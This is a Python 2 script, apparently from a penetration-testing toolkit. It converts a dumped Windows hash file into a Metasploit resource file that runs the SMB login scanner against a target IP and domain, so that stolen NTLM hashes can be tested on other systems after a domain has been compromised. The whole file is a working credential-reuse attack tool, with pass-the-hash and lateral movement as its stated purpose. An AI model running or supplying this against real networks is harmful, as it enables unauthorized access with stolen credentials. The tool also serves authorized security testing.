#!/usr/bin/python
####################################################################################################
#
# 
# Quick hash parser, will take a hashdump and put it into a Metasploit rc format.
#
#
# Useful if you compromise a different domain and need to verify if any of the creds work.
#
# Will use the smb_logins to test to see if the hashes work properly.
#
#
# Written by: David Kennedy (ReL1K) @HackingDave from https://www.trustedsec.com
# 
# Version: 0.1a
#
####################################################################################################
import sys
import os
try:
    filename = sys.argv[1]
    if not os.path.isfile(filename):
        print "\n[!] Filename not found boss. Try again.\n"
        raise IndexError
    ipaddr = sys.argv[2]

    # if we want to specify a domain name
    try:
        domain = sys.argv[3]

    except IndexError:
        domain = ""

except IndexError:
    print """Quick Hash Parser / Comparer 

Written by: David Kennedy (ReL1K) @HackingDave from https://www.trustedsec.com

This is a hash parser that will export a rc file compatible with Metasploit. This is useful when compromising a separate domain and want to see if any of the credentials work on another domain or other systems.

The first input is the filename that contains the hashes ex: Admin:500:LM:NTLM.
The second input is the remote IP address you want to use smb_logins on to validate if the creds work.
The third is the domain to attempt this on, leave this blank for workgroup

Usage: python hash_parser.py <hash_file.txt> <remote_ipaddr> <domain>
"""
    sys.exit()

# main parser
def parser(filename,ipaddr,domain):

    # variable for holding parsed data for rc format
    resource = "use auxiliary/scanner/smb/smb_login\nset RHOSTS %s\nset SMBDomain %s\nset USERPASS_FILE msf_hashes_parsed.txt\nset THREADS 200\nexploit\n\n" % (ipaddr,domain)
    filewrite = file("msf_hashes.rc", "w")
    filewrite.write(resource)
    filewrite.close()

    fileopen = file(filename, "r").readlines()
    # overwrite old file and/or create a new file
    filewrite = file("msf_hashes_parsed.txt", "w")
    filewrite.write("")
    filewrite.close()

    # append to list
    filewrite = file("msf_hashes_parsed.txt", "a")
    for line in fileopen:
        line = line.rstrip()
        if ":" in line:
            # auxiliary/scanner/smb/smb_login
            # format is userid:rid:lm:ntlm
            line = line.split(":")
            filewrite.write(line[0] + " " + line[2] + ":" + line[3] + "\n")
    filewrite.close()

    print "[*] Parsing complete, rc file exported as msf_hashes.rc and hashes exported in smb_logins format as msf_hashes_parsed.txt"

if __name__ == "__main__":
    parser(filename, ipaddr, domain)

